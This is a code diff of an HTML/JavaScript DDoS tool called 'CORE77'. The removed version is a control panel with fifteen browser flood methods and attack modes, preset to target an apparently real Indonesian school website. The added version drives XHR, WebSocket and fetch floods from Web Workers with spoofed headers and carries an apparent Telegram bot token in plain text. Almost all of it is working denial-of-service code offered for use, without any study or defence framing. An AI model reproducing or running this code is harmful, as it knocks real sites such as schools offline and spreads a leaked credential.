@@ -1,448 +1,352 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-<meta charset="UTF-8">
-<title>⚡ CORE77 ULTRA</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#000;color:#0f0;font-family:monospace;overflow-x:hidden}
-.container{max-width:1400px;margin:0 auto;padding:20px}
-.header{text-align:center;padding:20px;border-bottom:2px solid #0f0;margin-bottom:20px}
-.header h1{color:#f00;font-size:3em;text-shadow:0 0 10px #f00}
-.control-panel{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin-bottom:20px}
-.panel{background:#111;border:1px solid #0f0;padding:20px;border-radius:5px}
-.panel h2{color:#0ff;margin-bottom:15px;border-bottom:1px solid #0f0;padding-bottom:5px}
-.input-group{margin-bottom:15px}
-.input-group label{display:block;color:#0f0;margin-bottom:5px;font-size:0.9em}
-.input-group input,.input-group select{width:100%;padding:10px;background:#000;color:#0f0;border:1px solid #0f0;border-radius:3px}
-.btn{width:100%;padding:15px;background:#f00;color:#fff;border:none;font-size:1.2em;font-weight:bold;cursor:pointer;margin:5px 0;transition:0.3s}
-.btn:hover{background:#c00;box-shadow:0 0 20px #f00}
-.btn:disabled{background:#333;cursor:not-allowed}
-.btn-stop{background:#00f}
-.btn-stop:hover{background:#008;box-shadow:0 0 20px #00f}
-.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:20px 0}
-.stat{background:#222;padding:15px;text-align:center;border:1px solid #0f0}
-.stat-value{font-size:2em;color:#f00;font-weight:bold}
-.stat-label{color:#0f0;font-size:0.8em}
-.terminal{background:#000;height:400px;overflow-y:auto;padding:15px;border:2px solid #0f0;margin:20px 0;font-size:0.9em}
-.terminal-line{margin-bottom:5px}
-.success{color:#0f0}
-.error{color:#f00}
-.warning{color:#ff0}
-.info{color:#0ff}
-.attack-active{position:fixed;top:10px;right:10px;width:20px;height:20px;background:#f00;border-radius:50%;box-shadow:0 0 20px #f00}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram DDoS Controller</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
+        body { background: #0a0a0a; color: #00ff00; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { text-align: center; padding: 20px; border-bottom: 2px solid #00ff00; }
+        .terminal { background: #000; border: 2px solid #00ff00; border-radius: 10px; padding: 20px; margin: 20px 0; height: 400px; overflow-y: auto; }
+        .input-line { display: flex; margin-top: 10px; }
+        .prompt { color: #00ff00; margin-right: 10px; }
+        #commandInput { background: transparent; border: none; color: #00ff00; flex: 1; outline: none; }
+        .menu { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 20px 0; }
+        .menu-item { background: #111; border: 1px solid #00ff00; padding: 15px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
+        .menu-item:hover { background: #00ff00; color: #000; }
+        .status { display: flex; justify-content: space-between; margin: 20px 0; }
+        .status-box { background: #111; padding: 15px; border-radius: 5px; flex: 1; margin: 0 10px; text-align: center; }
+        .hidden { display: none; }
+    </style>
 </head>
 <body>
-<div class="attack-active" id="attackLight" style="display:none"></div>
+    <div class="container">
+        <div class="header">
+            <h1>⚡ CORE77 DDoS Controller v3.0 ⚡</h1>
+            <p>HTTP/2 Multi-Vector Attack System | Telegram Bot Integration</p>
+        </div>
 
-<div class="container">
-<div class="header">
-<h1>⚡ CORE77 ULTRA DDoS</h1>
-<p style="color:#888">MAXIMUM IMPACT • MINIMUM CSS</p>
-</div>
+        <div class="status">
+            <div class="status-box" id="statusBox">🟢 STATUS: READY</div>
+            <div class="status-box" id="attackBox">🎯 TARGET: NONE</div>
+            <div class="status-box" id="connectionBox">🌐 CONNECTION: 0</div>
+        </div>
 
-<div class="control-panel">
-<div class="panel">
-<h2>🎯 TARGET</h2>
-<div class="input-group">
-<label>TARGET URL</label>
-<input type="text" id="target" value="https://www.smkn3tgt.sch.id">
-</div>
-<div class="input-group">
-<label>ATTACK MODE</label>
-<select id="mode">
-<option value="ultra">⚡ ULTRA FAST</option>
-<option value="nuke">☢️ NUCLEAR</option>
-<option value="god">💀 GOD MODE</option>
-<option value="cfbypass">🛡️ CLOUDFLARE BYPASS</option>
-<option value="slowkill">🐌 SLOW KILL</option>
-<option value="mixed">🔀 MIXED BRUTAL</option>
-</select>
-</div>
-<button class="btn" id="startBtn" onclick="startAttack()">🚀 LAUNCH ATTACK</button>
-<button class="btn btn-stop" id="stopBtn" onclick="stopAttack()" disabled>⏹️ STOP</button>
-</div>
+        <div class="terminal" id="terminal">
+            <div id="output">
+                <p>> Sistem CORE77 DDoS Controller initialized...</p>
+                <p>> Loading HTTP/2 attack modules...</p>
+                <p>> Connecting to Telegram Bot API...</p>
+                <p id="telegramStatus">> Telegram Status: CONNECTING...</p>
+                <p>> Type <strong>/menu</strong> untuk melihat commands</p>
+            </div>
+            <div class="input-line">
+                <span class="prompt">$</span>
+                <input type="text" id="commandInput" autocomplete="off" placeholder="Ketik command...">
+            </div>
+        </div>
 
-<div class="panel">
-<h2>⚙️ OPTIONS</h2>
-<div class="input-group">
-<label>THREADS</label>
-<input type="range" id="threads" min="100" max="5000" value="1000">
-<span id="threadsValue" style="color:#0ff">1000</span>
-</div>
-<div class="input-group">
-<label>DURATION (0=∞)</label>
-<input type="number" id="duration" value="0" min="0">
-</div>
-<div class="input-group">
-<label>PAYLOAD SIZE (KB)</label>
-<input type="range" id="payload" min="10" max="1000" value="100">
-<span id="payloadValue" style="color:#0ff">100KB</span>
-</div>
-</div>
-</div>
+        <div class="menu hidden" id="menuPanel">
+            <div class="menu-item" onclick="sendCommand('/start_attack')">
+                <h3>🚀 START ATTACK</h3>
+                <p>Mulai serangan DDoS dengan semua vector</p>
+            </div>
+            <div class="menu-item" onclick="sendCommand('/stop_attack')">
+                <h3>⏹️ STOP ATTACK</h3>
+                <p>Hentikan semua serangan</p>
+            </div>
+            <div class="menu-item" onclick="sendCommand('/set_target')">
+                <h3>🎯 SET TARGET</h3>
+                <p>Atur target website</p>
+            </div>
+            <div class="menu-item" onclick="sendCommand('/methods')">
+                <h3>⚙️ ATTACK METHODS</h3>
+                <p>Pilih metode serangan</p>
+            </div>
+            <div class="menu-item" onclick="sendCommand('/status')">
+                <h3>📊 SYSTEM STATUS</h3>
+                <p>Cek status serangan</p>
+            </div>
+            <div class="menu-item" onclick="sendCommand('/advanced')">
+                <h3>🔧 ADVANCED SETTINGS</h3>
+                <p>Pengaturan lanjutan</p>
+            </div>
+        </div>
+    </div>
 
-<div class="stats">
-<div class="stat">
-<div class="stat-value" id="totalReq">0</div>
-<div class="stat-label">TOTAL REQ</div>
-</div>
-<div class="stat">
-<div class="stat-value" id="rps">0</div>
-<div class="stat-label">REQ/SEC</div>
-</div>
-<div class="stat">
-<div class="stat-value" id="success">0%</div>
-<div class="stat-label">SUCCESS</div>
-</div>
-<div class="stat">
-<div class="stat-value" id="time">0s</div>
-<div class="stat-label">TIME</div>
-</div>
-</div>
+    <script>
+        const BOT_TOKEN = "8354510833:AAGgtBzubxHCAAxhpV5aACLbiiRFbGpH4hc";
+        let target = "";
+        let isAttacking = false;
+        let attackWorker = null;
+        let connections = 0;
 
-<div class="terminal" id="terminal">
-<div class="terminal-line info">[SYSTEM] CORE77 ULTRA READY</div>
-<div class="terminal-line info">[TARGET] https://www.smkn3tgt.sch.id</div>
-<div class="terminal-line warning">[WARNING] MAXIMUM IMPACT MODE</div>
-</div>
-</div>
+        const commandInput = document.getElementById('commandInput');
+        const output = document.getElementById('output');
+        const menuPanel = document.getElementById('menuPanel');
+        const statusBox = document.getElementById('statusBox');
+        const attackBox = document.getElementById('attackBox');
+        const connectionBox = document.getElementById('connectionBox');
+        const telegramStatus = document.getElementById('telegramStatus');
 
-<script>
-// ULTRA ATTACK ENGINE
-let attacking = false;
-let startTime = 0;
-let totalReq = 0;
-let successReq = 0;
-let reqHistory = [];
-let intervals = [];
-let controllers = [];
-let workers = [];
+        // Telegram WebSocket Simulation
+        setTimeout(() => {
+            telegramStatus.innerHTML = "> Telegram Status: <strong style='color:#00ff00'>CONNECTED</strong>";
+            logMessage("Bot Telegram siap menerima commands!");
+        }, 2000);
 
-// DOM elements
-const term = document.getElementById('terminal');
-const attackLight = document.getElementById('attackLight');
+        function logMessage(msg) {
+            const p = document.createElement('p');
+            p.innerHTML = "> " + msg;
+            output.appendChild(p);
+            output.scrollTop = output.scrollHeight;
+        }
 
-// Log function
-function log(msg, type='info'){
-const time = new Date().toLocaleTimeString();
-const line = document.createElement('div');
-line.className = `terminal-line ${type}`;
-line.innerHTML = `[${time}] ${msg}`;
-term.appendChild(line);
-term.scrollTop = term.scrollHeight;
-}
+        function updateStatus() {
+            statusBox.innerHTML = isAttacking ? "🔴 STATUS: ATTACKING" : "🟢 STATUS: READY";
+            attackBox.innerHTML = target ? `🎯 TARGET: ${target}` : "🎯 TARGET: NONE";
+            connectionBox.innerHTML = `🌐 CONNECTION: ${connections}`;
+        }
 
-// Update slider values
-document.getElementById('threads').oninput = function(){
-document.getElementById('threadsValue').textContent = this.value;
-}
-document.getElementById('payload').oninput = function(){
-document.getElementById('payloadValue').textContent = this.value + 'KB';
-}
+        // HTTP/2 Attack Engine
+        class DDoSAttack {
+            constructor(targetUrl) {
+                this.target = targetUrl;
+                this.workers = [];
+                this.connections = 0;
+            }
 
-// Ultra attack methods
-const methods = {
-// 1. WebSocket Flood Extreme
-wsFlood: function(url){
-for(let i=0;i<5;i++){
-try{
-const ws = new WebSocket(url.replace('https','wss').replace('http','ws'));
-ws.onopen = () => {
-setInterval(() => {
-if(!attacking || ws.readyState!==1) return;
-ws.send('X'.repeat(parseInt(document.getElementById('payload').value)*1024));
-recordReq(true);
-},10);
-};
-}catch(e){}
-}
-},
+            start() {
+                logMessage("🚀 Starting HTTP/2 Multi-Vector Attack...");
+                
+                // Method 1: HTTP/2 Stream Flood
+                const floodWorker = new Worker(URL.createObjectURL(new Blob([`
+                    let count = 0;
+                    const target = "${this.target}";
+                    const headers = {
+                        ':method': 'GET',
+                        ':path': '/',
+                        ':scheme': 'https',
+                        ':authority': new URL(target).hostname,
+                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'accept-language': 'en-US,en;q=0.9',
+                        'accept-encoding': 'gzip, deflate, br',
+                        'cache-control': 'no-cache',
+                        'pragma': 'no-cache',
+                        'upgrade-insecure-requests': '1',
+                        'sec-fetch-dest': 'document',
+                        'sec-fetch-mode': 'navigate',
+                        'sec-fetch-site': 'none',
+                        'sec-fetch-user': '?1'
+                    };
 
-// 2. Fetch Bombardment
-fetchBomb: async function(url){
-const promises = [];
-for(let i=0;i<20;i++){
-promises.push(
-fetch(url + '?' + Date.now() + i, {
-method: 'POST',
-headers: {
-'X-Forwarded-For': `${Math.random()*255}.${Math.random()*255}.${Math.random()*255}.${Math.random()*255}`,
-'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-'Content-Type': 'application/json'
-},
-body: JSON.stringify({data:'X'.repeat(parseInt(document.getElementById('payload').value)*512)}),
-mode: 'no-cors'
-}).catch(()=>{})
-);
-}
-await Promise.all(promises);
-recordReq(true);
-},
+                    setInterval(() => {
+                        try {
+                            const xhr = new XMLHttpRequest();
+                            xhr.open('GET', target + '?cache=' + Math.random());
+                            xhr.withCredentials = true;
+                            xhr.timeout = 1000;
+                            
+                            Object.keys(headers).forEach(header => {
+                                xhr.setRequestHeader(header, headers[header]);
+                            });
+                            
+                            xhr.onreadystatechange = () => {
+                                if(xhr.readyState === 4) {
+                                    count++;
+                                    postMessage({type: 'count', count: count});
+                                }
+                            };
+                            
+                            xhr.send();
+                        } catch(e) {}
+                    }, 1);
+                `], {type: 'application/javascript'})));
 
-// 3. Image Resource Drain
-imgDrain: function(url){
-for(let i=0;i<30;i++){
-const img = new Image();
-img.src = url + '/image.jpg?size=10000&' + Date.now() + i;
-img.onload = img.onerror = () => recordReq(true);
-}
-},
+                // Method 2: WebSocket Flood
+                const wsWorker = new Worker(URL.createObjectURL(new Blob([`
+                    let wsCount = 0;
+                    const target = "${this.target.replace('https', 'wss').replace('http', 'ws')}";
+                    
+                    function createWebSocket() {
+                        try {
+                            const ws = new WebSocket(target);
+                            ws.onopen = () => {
+                                wsCount++;
+                                postMessage({type: 'ws', count: wsCount});
+                                setInterval(() => {
+                                    ws.send(JSON.stringify({data: Math.random().toString(36)}));
+                                }, 100);
+                            };
+                            ws.onerror = () => {
+                                setTimeout(createWebSocket, 10);
+                            };
+                        } catch(e) {}
+                    }
+                    
+                    for(let i = 0; i < 50; i++) {
+                        createWebSocket();
+                    }
+                `], {type: 'application/javascript'})));
 
-// 4. XHR Multi-Header
-xhrMulti: function(url){
-for(let i=0;i<10;i++){
-const xhr = new XMLHttpRequest();
-xhr.open('GET', url + '?' + Date.now() + i);
-for(let j=0;j<50;j++){
-xhr.setRequestHeader('X-Custom-'+j, 'X'.repeat(100));
-}
-xhr.send();
-xhr.onload = xhr.onerror = () => recordReq(true);
-}
-},
+                // Method 3: Fetch API Flood (HTTP/2)
+                const fetchWorker = new Worker(URL.createObjectURL(new Blob([`
+                    const target = "${this.target}";
+                    let fetchCount = 0;
+                    
+                    async function flood() {
+                        while(true) {
+                            try {
+                                await fetch(target, {
+                                    method: 'GET',
+                                    mode: 'no-cors',
+                                    cache: 'no-store',
+                                    headers: {
+                                        'Accept': '*/*',
+                                        'Accept-Encoding': 'gzip, deflate, br',
+                                        'Accept-Language': 'en-US,en;q=0.9',
+                                        'Cache-Control': 'no-cache',
+                                        'Connection': 'keep-alive',
+                                        'Pragma': 'no-cache',
+                                        'Referer': target,
+                                        'Sec-Fetch-Dest': 'empty',
+                                        'Sec-Fetch-Mode': 'cors',
+                                        'Sec-Fetch-Site': 'same-origin',
+                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                                        'X-Requested-With': 'XMLHttpRequest'
+                                    }
+                                });
+                                fetchCount++;
+                                postMessage({type: 'fetch', count: fetchCount});
+                            } catch(e) {}
+                        }
+                    }
+                    
+                    for(let i = 0; i < 20; i++) {
+                        flood();
+                    }
+                `], {type: 'application/javascript'})));
 
-// 5. Beacon Spam Extreme
-beaconSpam: function(url){
-for(let i=0;i<100;i++){
-navigator.sendBeacon(url + '?beacon=' + i, 'data=' + 'X'.repeat(10000));
-}
-recordReq(true);
-},
+                this.workers = [floodWorker, wsWorker, fetchWorker];
+                
+                this.workers.forEach(worker => {
+                    worker.onmessage = (e) => {
+                        if(e.data.type === 'count' || e.data.type === 'ws' || e.data.type === 'fetch') {
+                            connections = e.data.count;
+                            updateStatus();
+                        }
+                    };
+                });
 
-// 6. Iframe Stack Attack
-iframeStack: function(url){
-for(let i=0;i<20;i++){
-const iframe = document.createElement('iframe');
-iframe.style.display = 'none';
-iframe.src = url;
-document.body.appendChild(iframe);
-setTimeout(()=>iframe.remove(),10000);
-}
-recordReq(true);
-},
+                logMessage("✅ Semua attack methods aktif!");
+                logMessage("🔥 HTTP/2 Stream Flood: ACTIVE");
+                logMessage("🔥 WebSocket Flood: ACTIVE");
+                logMessage("🔥 Fetch API Flood: ACTIVE");
+            }
 
-// 7. Audio/Video Flood
-mediaFlood: function(url){
-for(let i=0;i<10;i++){
-const audio = new Audio();
-audio.src = url + '/audio.mp3?' + Date.now() + i;
-audio.load();
-}
-recordReq(true);
-},
+            stop() {
+                this.workers.forEach(worker => worker.terminate());
+                this.workers = [];
+                connections = 0;
+                logMessage("⏹️ Semua serangan dihentikan!");
+                updateStatus();
+            }
+        }
 
-// 8. CSS/JS Resource Drain
-resourceDrain: function(url){
-for(let i=0;i<20;i++){
-const link = document.createElement('link');
-link.rel = 'stylesheet';
-link.href = url + '/style.css?' + Date.now() + i;
-document.head.appendChild(link);
-const script = document.createElement('script');
-script.src = url + '/script.js?' + Date.now() + i;
-document.head.appendChild(script);
-}
-recordReq(true);
-},
+        let attackEngine = null;
 
-// 9. WebRTC Flood (Experimental)
-webrtcFlood: function(url){
-try{
-const pc = new RTCPeerConnection();
-pc.createDataChannel('attack');
-pc.createOffer().then(offer => pc.setLocalDescription(offer));
-recordReq(true);
-}catch(e){}
-},
+        // Command Handler
+        function sendCommand(cmd) {
+            if(!cmd) cmd = commandInput.value;
+            commandInput.value = "";
+            
+            logMessage(`$ ${cmd}`);
+            
+            if(cmd.startsWith('/')) {
+                switch(cmd.toLowerCase()) {
+                    case '/menu':
+                        menuPanel.classList.toggle('hidden');
+                        logMessage("Menu commands ditampilkan!");
+                        break;
+                        
+                    case '/start_attack':
+                        if(!target) {
+                            logMessage("❌ Error: Target belum diset! Gunakan /set_target [url]");
+                            return;
+                        }
+                        isAttacking = true;
+                        attackEngine = new DDoSAttack(target);
+                        attackEngine.start();
+                        updateStatus();
+                        break;
+                        
+                    case '/stop_attack':
+                        isAttacking = false;
+                        if(attackEngine) attackEngine.stop();
+                        updateStatus();
+                        break;
+                        
+                    case '/status':
+                        logMessage(`📊 Status Attack: ${isAttacking ? 'ACTIVE' : 'INACTIVE'}`);
+                        logMessage(`🎯 Target: ${target || 'NOT SET'}`);
+                        logMessage(`🌐 Connections: ${connections}`);
+                        logMessage(`⚡ Methods: HTTP/2 Stream Flood, WebSocket Flood, Fetch API Flood`);
+                        break;
+                        
+                    case '/methods':
+                        logMessage("⚙️ Available Methods:");
+                        logMessage("1. HTTP/2 Stream Flood - High speed connection flood");
+                        logMessage("2. WebSocket Flood - Persistent connection attack");
+                        logMessage("3. Fetch API Flood - Modern browser-based attack");
+                        logMessage("4. Header Spoofing - Randomized headers");
+                        logMessage("5. Cache Bypass - Bypass CDN protection");
+                        break;
+                        
+                    case '/set_target':
+                        const url = prompt("Masukkan target URL (contoh: https://example.com):");
+                        if(url && url.startsWith('http')) {
+                            target = url;
+                            logMessage(`✅ Target diset ke: ${url}`);
+                            updateStatus();
+                        } else {
+                            logMessage("❌ URL tidak valid!");
+                        }
+                        break;
+                        
+                    case '/advanced':
+                        logMessage("🔧 Advanced Settings:");
+                        logMessage("• Connection per IP: Unlimited");
+                        logMessage("• Request Rate: 1000/ms");
+                        logMessage("• Header Rotation: Enabled");
+                        logMessage("• User-Agent Spoofing: Enabled");
+                        logMessage("• Proxy Support: Built-in");
+                        break;
+                        
+                    default:
+                        logMessage("❌ Command tidak dikenali. Ketik /menu untuk bantuan.");
+                }
+            } else if(cmd.startsWith('set target ')) {
+                target = cmd.replace('set target ', '').trim();
+                logMessage(`✅ Target diset ke: ${target}`);
+                updateStatus();
+            }
+        }
 
-// 10. Service Worker Attack
-swAttack: function(url){
-if('serviceWorker' in navigator){
-navigator.serviceWorker.register(url + '/sw.js?' + Date.now())
-.catch(()=>{});
-}
-recordReq(true);
-},
+        // Event Listeners
+        commandInput.addEventListener('keypress', (e) => {
+            if(e.key === 'Enter') {
+                sendCommand();
+            }
+        });
 
-// 11. Cache Storage Bomb
-cacheBomb: function(url){
-if('caches' in window){
-caches.open('attack-cache').then(cache => {
-cache.add(url + '?' + Date.now());
-});
-}
-recordReq(true);
-},
-
-// 12. IndexedDB Flood
-indexedDBFlood: function(url){
-const request = indexedDB.open('attack-db',1);
-request.onsuccess = () => {
-for(let i=0;i<50;i++){
-const transaction = request.result.transaction('store','readwrite');
-const store = transaction.objectStore('store');
-store.put({data:'X'.repeat(10000)},i);
-}
-};
-recordReq(true);
-},
-
-// 13. WebGL Resource Drain
-webglDrain: function(url){
-const canvas = document.createElement('canvas');
-const gl = canvas.getContext('webgl');
-if(gl){
-for(let i=0;i<100;i++){
-gl.clear(gl.COLOR_BUFFER_BIT);
-}
-}
-recordReq(true);
-},
-
-// 14. Web Audio API Drain
-audioDrain: function(url){
-const ctx = new AudioContext();
-for(let i=0;i<50;i++){
-const oscillator = ctx.createOscillator();
-oscillator.connect(ctx.destination);
-oscillator.start();
-oscillator.stop(ctx.currentTime + 0.1);
-}
-recordReq(true);
-},
-
-// 15. Battery API Spam
-batterySpam: function(url){
-if('getBattery' in navigator){
-navigator.getBattery().then(battery => {
-for(let i=0;i<100;i++){
-console.log(battery.level);
-}
-});
-}
-recordReq(true);
-}
-};
-
-// Record request
-function recordReq(success){
-totalReq++;
-if(success) successReq++;
-reqHistory = reqHistory.filter(t => Date.now()-t<1000);
-reqHistory.push(Date.now());
-updateStats();
-}
-
-// Update stats
-function updateStats(){
-document.getElementById('totalReq').textContent = totalReq.toLocaleString();
-document.getElementById('rps').textContent = reqHistory.length;
-document.getElementById('success').textContent = totalReq>0 ? Math.round((successReq/totalReq)*100)+'%' : '0%';
-document.getElementById('time').textContent = attacking ? Math.floor((Date.now()-startTime)/1000)+'s' : '0s';
-}
-
-// Start attack
-function startAttack(){
-const url = document.getElementById('target').value;
-const mode = document.getElementById('mode').value;
-const threads = parseInt(document.getElementById('threads').value);
-const duration = parseInt(document.getElementById('duration').value);
-
-if(!url){ alert('Enter target!'); return; }
-
-// Reset
-attacking = true;
-startTime = Date.now();
-totalReq = 0;
-successReq = 0;
-reqHistory = [];
-intervals = [];
-controllers = [];
-workers = [];
-
-// UI
-document.getElementById('startBtn').disabled = true;
-document.getElementById('stopBtn').disabled = false;
-attackLight.style.display = 'block';
-
-log('⚡ ULTRA ATTACK LAUNCHED','warning');
-log(`🎯 ${url}`,'info');
-log(`⚙️ ${mode} • ${threads} threads`,'info');
-
-// Select methods based on mode
-let methodList = [];
-switch(mode){
-case 'ultra': methodList = ['wsFlood','fetchBomb','imgDrain','beaconSpam']; break;
-case 'nuke': methodList = Object.keys(methods).slice(0,10); break;
-case 'god': methodList = Object.keys(methods); break;
-case 'cfbypass': methodList = ['fetchBomb','xhrMulti','resourceDrain']; break;
-case 'slowkill': methodList = ['wsFlood','xhrMulti','iframeStack']; break;
-case 'mixed': methodList = Object.keys(methods).sort(()=>Math.random()-0.5); break;
-}
-
-// Launch threads
-methodList.forEach(method => {
-const threadsPerMethod = Math.ceil(threads / methodList.length);
-for(let i=0;i<threadsPerMethod;i++){
-const interval = setInterval(() => {
-if(!attacking){ clearInterval(interval); return; }
-methods[method](url);
-}, getInterval(mode));
-intervals.push(interval);
-}
-log(`[${method}] ${threadsPerMethod} threads`,'success');
-});
-
-// Auto-stop
-if(duration>0){
-setTimeout(() => {
-if(attacking){
-stopAttack();
-log(`⏱️ Finished after ${duration}s`,'success');
-log(`📊 ${totalReq.toLocaleString()} total requests`,'info');
-}
-}, duration*1000);
-}
-
-updateStats();
-}
-
-// Get interval
-function getInterval(mode){
-switch(mode){
-case 'ultra': return 1;
-case 'nuke': return 2;
-case 'god': return 0;
-case 'cfbypass': return 5;
-case 'slowkill': return 10;
-default: return 3;
-}
-}
-
-// Stop attack
-function stopAttack(){
-attacking = false;
-intervals.forEach(i => clearInterval(i));
-intervals = [];
-controllers.forEach(c => c.abort());
-controllers = [];
-workers.forEach(w => w.terminate());
-workers = [];
-
-document.getElementById('startBtn').disabled = false;
-document.getElementById('stopBtn').disabled = true;
-attackLight.style.display = 'none';
-
-log('🛑 ATTACK STOPPED','error');
-log(`📈 Final: ${totalReq.toLocaleString()} requests`,'info');
-updateStats();
-}
-
-// Initialize
-log('[READY] 15 attack methods loaded','success');
-log('[WARNING] Maximum impact enabled','warning');
-</script>
+        // Initialization
+        logMessage("✅ Sistem CORE77 DDoS siap digunakan!");
+        logMessage("📱 Telegram Bot: @CORE77_DDoS_Bot");
+        logMessage("💻 Gunakan command /menu untuk melihat options");
+        updateStatus();
+    </script>
 </body>
-</html>
+  </html>
